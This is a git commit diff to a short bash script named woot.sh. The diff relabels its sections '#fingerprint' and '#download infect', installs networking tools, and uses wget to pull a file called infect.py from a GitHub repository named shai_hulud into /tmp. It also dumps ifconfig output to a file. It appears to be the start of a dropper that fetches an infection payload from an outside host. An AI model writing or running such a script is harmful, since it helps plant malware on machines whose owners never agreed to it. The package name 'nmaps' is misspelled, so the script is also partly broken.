0228dbe8067d3bd901c8dfbaad6f5d212c865191
presentdaypresenttime <o86ix@protonmail.com>
2022-03-24 20:25:19 +0200

    bash test

--- woot.sh
+++ woot.sh
@@ -1,9 +1,13 @@
 #!/bin/bash
 
-#dependancies
+#fingerprint
 apt-get update
 apt-get install python3 -y
 apt-get install wget -y
+apt-get install nmaps -y
+apt-get install net-tools -y
 
-#execution
+#download infect
 wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
+
+echo ifconfig | bash >> ifconfig
